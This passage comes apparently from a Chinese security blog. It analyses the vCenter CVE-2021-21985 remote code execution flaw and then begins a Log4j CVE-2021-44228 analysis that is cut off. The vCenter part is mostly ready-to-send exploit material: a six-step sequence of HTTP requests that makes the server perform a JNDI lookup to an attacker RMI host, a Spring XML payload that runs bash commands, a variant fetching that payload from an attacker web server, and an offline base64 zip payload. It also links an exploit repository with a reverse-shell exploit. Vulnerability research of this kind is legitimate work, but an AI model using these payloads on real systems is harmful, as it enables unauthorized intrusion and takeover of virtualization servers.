<p>这都不重要。</p>
<h5 id="0x01-利用了Java反射方法"><a href="#0x01-利用了Java反射方法" class="headerlink" title="0x01 利用了Java反射方法"></a>0x01 利用了Java反射方法</h5><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622796530697.png"></p>
<p>在 <code>com/vmware/vsan/client/services/ProxygenController.class:117</code> </p>
<p>大致能确定应该是通过反射调用类来触发远程代码执行漏洞。</p>
<h5 id="0x02-基本参数构造"><a href="#0x02-基本参数构造" class="headerlink" title="0x02 基本参数构造"></a>0x02 基本参数构造</h5><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622797341301.png"></p>
<p>这里使用的spring框架，所以通过<code>RequestMapping</code> 就可以获得路由的构造，通过访问路由<code>/service/&#123;beanIdOrClassName&#125;/&#123;methodName&#125;</code> 就可以获取到 <code>beanIdOrClassName</code> <code>methodName</code> 和 json格式的body。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">rawData</span> = (List)body.get(<span class="string">&quot;methodInput&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>body是接收的json格式，rawData有被强转换成 List类型</p>
<p>所以构造的body格式如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;methodInput&quot;</span>: [<span class="literal">null</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>然后传入到 <code>invokeService</code> 函数中进行调用。</p>
<h5 id="0x03-寻找可利用的Spring-Bean"><a href="#0x03-寻找可利用的Spring-Bean" class="headerlink" title="0x03 寻找可利用的Spring Bean"></a>0x03 寻找可利用的Spring Bean</h5><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622798352641.png"></p>
<p>通过 <code>Class.forName(beanIdOrClassName);</code> 传入的class名</p>
<p>然后会在spring bean在中获取对应class名的bean实体，在获取对应的方法列表，这些注册的bean中又存在危险方法和可利用Bean时，就可以进一步进行反射调用，从而达到远程命令执行的后果</p>
<p>在 <code>h5-vsan-service.jar!/META-INF/spring/base/vsan-base-context.xml:35</code> </p>
<p>出现可疑的类 <code>org.springframework.beans.factory.config.MethodInvokingFactoryBean</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622882809861.png"></p>
<p>进入继承类，</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622882982659.png"></p>
<p>再进入继承类，直到最底层 <code>org.springframework.util.MethodInvoker</code></p>
<p>会发现这里方法大多都是公开类型，说明在外部可以直接调用，并且还存在一个 <code>invoke()</code> 方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622883045935.png"></p>
<p>综上所述 <code>vsanProviderUtils_setVmodlHelper</code> 端点的漏洞触发就是基于 <code>MethodInvoker</code> 类的反射调用了</p>
<h5 id="0x04-构造利用链"><a href="#0x04-构造利用链" class="headerlink" title="0x04 构造利用链"></a>0x04 构造利用链</h5><p>接着开始构造利用链</p>
<p>vSphere UI 默认是Tomcat中间件，所以用Tomcat RMI Bypass 的方式就能远程命令执行</p>
<p>关键的类 <code>javax.naming.InitialContext.doLookup</code></p>
<p>触发步骤：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">methodInvoker.setTargetObject(null)<span class="comment">;</span></span><br><span class="line">methodInvoker.setStaticMethod(<span class="string">&quot;javax.naming.InitialContext.doLookup&quot;</span>)<span class="comment">;</span></span><br><span class="line">methodInvoker.setTargetMethod(<span class="string">&quot;doLookup&quot;</span>)<span class="comment">;</span></span><br><span class="line">methodInvoker.setArguments(<span class="string">&quot;rmi://ip:1099/Exploit&quot;</span>)<span class="comment">;</span></span><br><span class="line">methodInvoker.prepare()<span class="comment">;</span></span><br><span class="line">methodInvoker.invoke()<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>PoC构造：</p>
<p>直接访问 <code>/ui/h5-vsan/rest/proxy/service/org.springframework.beans.factory.config.MethodInvokingFactoryBean/setTargetObject</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622773369017.png"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">No qualifying bean of type &#x27;org.springframework.beans.factory.config.MethodInvokingFactoryBean&#x27; available: expected single matching bean but found <span class="number">7</span>: <span class="meta">&amp;vsanProviderUtils_setVmodlHelper,</span></span><br><span class="line"><span class="meta">&amp;vsanProviderUtils_setVsanServiceFactory,</span></span><br><span class="line"><span class="meta">&amp;vsanQueryUtil_setDataService,</span></span><br><span class="line"><span class="meta">&amp;vsanCapabilityUtils_setVsanCapabilityCacheManager,</span></span><br><span class="line"><span class="meta">&amp;vsanUtils_setMessageBundle,</span></span><br><span class="line"><span class="meta">&amp;vsanFormatUtils_setUserSessionService,</span></span><br><span class="line"><span class="meta">&amp;vsphereHealthProviderUtils_setVsphereHealthServiceFactory</span></span><br></pre></td></tr></table></figure>

<p>肯定是无法找到的，并且找到的几个映射的bean name，需要通过bean name进行映射调用</p>
<p><code>&amp;vsanProviderUtils_setVmodlHelper</code> -&gt; <code>org.springframework.beans.factory.config.MethodInvokingFactoryBean</code></p>
<p><strong>完整PoC</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setTargetObject</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>23</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [null]&#125;</span><br></pre></td></tr></table></figure>

<p>其他几个步骤一样的构造方法。</p>
<h5 id="0x05-回显利用链"><a href="#0x05-回显利用链" class="headerlink" title="0x05 回显利用链"></a>0x05 回显利用链</h5><p>分析的话，就看原作者的吧 <a href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/">http://noahblog.360.cn/vcenter-cve-2021-2021-21985/</a></p>
<p>利用的是 <code>com.vmware.vim.vmomi.core.types.impl.VmodContextImpl</code> 的 <code>loadVmodlPackage</code> 方法</p>
<p>并且方法中调用了 <code>SpringContextLoader</code>  <code>vmodPackage</code> 可控，最终可以指定一个 XML 文件路径，Spring 会解析 XML 的内容，造成 SpEL 注入，从而实现执行任意代码。</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="Tomcat-RMI-利用链POC"><a href="#Tomcat-RMI-利用链POC" class="headerlink" title="Tomcat RMI 利用链POC"></a>Tomcat RMI 利用链POC</h5><p>Step 1 setTargetObject to null</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setTargetObject</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>23</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [null]&#125;</span><br></pre></td></tr></table></figure>

<p>Step 2 setStaticMethod to payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setStaticMethod</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>57</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [&quot;javax.naming.InitialContext.doLookup&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>Step 3 setTargetMethod to doLookup</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setTargetMethod</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [&quot;doLookup&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>Step 4 setArguments with payload args</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/setArguments</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>56</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [[&quot;rmi://vps_ip:1099/pblc0c&quot;]]&#125;</span><br></pre></td></tr></table></figure>

<p>Step 5 initial payload class and methods</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/prepare</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>23</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [null]&#125;</span><br></pre></td></tr></table></figure>

<p>Step 6 trigger method invoke</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/&amp;vsanProviderUtils_setVmodlHelper/invoke</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>23</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [null]&#125;</span><br></pre></td></tr></table></figure>



<h5 id="可出网回显PoC"><a href="#可出网回显PoC" class="headerlink" title="可出网回显PoC"></a>可出网回显PoC</h5><p><strong>context.xml</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="tag"><span class="string">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[ ls -la /  2&gt;&amp;1 ]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;is&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>#&#123;pb.start().getInputStream()&#125;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;br&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>#&#123;is&#125;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;collectors&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.util.stream.Collectors&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;system&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.System&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; system.setProperty(<span class="symbol">&amp;quot;</span>output<span class="symbol">&amp;quot;</span>, br.lines().collect(collectors.joining(<span class="symbol">&amp;quot;</span>\n<span class="symbol">&amp;quot;</span>))) &#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用python开启web服务器</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [[&quot;http://169090381:9999&quot;]]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622885241417.png"></p>
<p>调用 <code>systemProperties</code> 的 <code>getProperty</code> 方法来获取内存在执行命令的结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [&quot;output&quot;,null]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622885263493.png"></p>
<h5 id="不可出网PoC"><a href="#不可出网PoC" class="headerlink" title="不可出网PoC"></a>不可出网PoC</h5><p>结合了SSRF直接通过 <code>data:text/html;base64,</code> 方式加载压缩包，在 <code>driverOfflineBundle</code> 的方法中会自动解压提取内部的xml，导致不出网触发漏洞</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>893</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [[&quot;https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,UEsDBBQAAAAIAKd4xVKwSBTWpQEAAIgEAAASAAAAb2ZmbGluZV9idW5kbGUueG1spVNNT9wwFLwj8R/cIKGNxNrQ3rZJJD4uSCAhtodKlIPjfZsYHDv4OZtFiP+Oay9lv1ppSy5x3pt5mRnbWQlcI5k3SmOe1M61I8b6vqfYWqmrqeUN9MY+UmMrhqKGhrNASfb3SHwCdzRHucLvvwXK1+PjE/bz+mocqEOp0XEtYImNchTnXhnBnTQ6f2/uoGYXLIuAYfigc5wkRfxhyILISZ60ZUKE4ugjeeAzThXXFb2xRgDiWSfVBOw7KRCF8b5sJ5yxQ26rpZZvKolupeJrM646KFgpNSs51hmLha2oofhnO/tyd35x+uP0jvS14Y0k9/fFNkLG1oRkbLvsLMS0kYnE1UykoZe67dzYWeDNLfBdQvmj/uClLak/E9YNUlqBWxo5SF83fewourQbos+66RQsTP5fscTPCxNGKfgNXUu1c1JRDP7p+Qem+MsYfEYHzZbDOo6NZYGtNS1Y90y0vxl50tfcwcwnQIKVPDl4IXEcRXA3C/Dg8Kkz7rvpnN+XuD4ipaVKakC/ZQsfgw8/9MFI7e/XgvlLx3eapuQ1YeupxAUWb1BLAQIfABQAAAAIAKd4xVKwSBTWpQEAAIgEAAASACQAAAAAAAAAIAAAAAAAAABvZmZsaW5lX2J1bmRsZS54bWwKACAAAAAAAAEAGADeNPEi2VnXAd408SLZWdcBm/yF3shZ1wFQSwUGAAAAAAEAAQBkAAAA1QEAAAAA#&quot;]]&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.80.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.23.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"></span><br><span class="line">&#123;&quot;methodInput&quot;: [&quot;output&quot;,null]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622885496313.png"></p>
<h4 id="漏洞EXP"><a href="#漏洞EXP" class="headerlink" title="漏洞EXP"></a>漏洞EXP</h4><p><a href="https://github.com/r0ckysec/CVE-2021-21985">https://github.com/r0ckysec/CVE-2021-21985</a></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622885937281.png"></p>
<h5 id="rmi反弹shell-exp"><a href="#rmi反弹shell-exp" class="headerlink" title="rmi反弹shell exp"></a>rmi反弹shell exp</h5><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622885595771.png"></p>
<h5 id="可回显exp"><a href="#可回显exp" class="headerlink" title="可回显exp"></a>可回显exp</h5><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622885638596.png"></p>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/">https://www.iswin.org/2021/06/02/Vcenter-Server-CVE-2021-21985-RCE-PAYLOAD/</a></p>
<p><a href="https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985#rapid7-analysis">https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985#rapid7-analysis</a></p>
<p><a href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/">http://noahblog.360.cn/vcenter-cve-2021-2021-21985/</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞POC</tag>
        <tag>漏洞EXP</tag>
        <tag>Java</tag>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2021-44228）Apache Log4j2任意代码执行漏洞</title>
    <url>/2021/12/13/analysis_20211213/</url>
    <content><![CDATA[<blockquote>
<p>前段时间忙着写Go的平台，一看已经好久没发文章了，这几天的log4j直接把我炸醒，可真是天翻地覆，全世界都在dnslog，趁着周末分析分析发发文。</p>
</blockquote>
<span id="more"></span>


<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>Maven构建</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
<blockquote>
<p>相关组件：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等众多组件与大型应用均受影响</p>
</blockquote>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>构造漏洞环境，将接收恶意参数传入log日志打印中</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639196445175.png"></p>
<p>跟进打印方法，直到 <code>log4j-core-2.14.1.jar!/org/apache/logging/log4j/core/config/LoggerConfig.class:295</code> </p>
<p>这里调用了 <code>org.apache.logging.log4j.core.config.LoggerConfig#processLogEvent</code> 方法对日志内容进行处理</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639197408972.png"></p>
<p>其中包括日志消息的格式化渲染</p>
<p>![](<a href="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/AbstractOutputStreamAppender.class:89%60%E5%A4%84%E5%AF%B9%E6%97%A5%E5%BF%97%E8%BF%9B%E8%A1%8C%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F%E5%8C%96">https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/AbstractOutputStreamAppender.class:89`处对日志进行输出格式化</a></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639198307262.png"></p>
<p>接着在 <code>log4j-core-2.14.1.jar!/org/apache/logging/log4j/core/layout/PatternLayout.class:406</code> 处对日志内容进行提取处理，<strong>漏洞触发就在这里开始</strong></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639198437913.png"></p>
<p>跟进 <code>org.apache.logging.log4j.core.pattern.PatternFormatter#format</code> 方法（<strong>核心部分</strong>）</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639198639758.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639199096344.png"></p>
<p><code>log4j-core-2.14.1.jar!/org/apache/logging/log4j/core/pattern/MessagePatternConverter.class:116</code></p>
<p>匹配了字符中的 <code>$&#123;</code>，判断成功则进入，继续跟进到 </p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">workingBuilder.append(<span class="keyword">this</span>.<span class="built_in">config</span>.getStrSubstitutor().replace(event, value));</span><br></pre></td></tr></table></figure>

<p><code>org.apache.logging.log4j.core.lookup.StrSubstitutor#replace(org.apache.logging.log4j.core.LogEvent, java.lang.String)</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639199376890.png"></p>
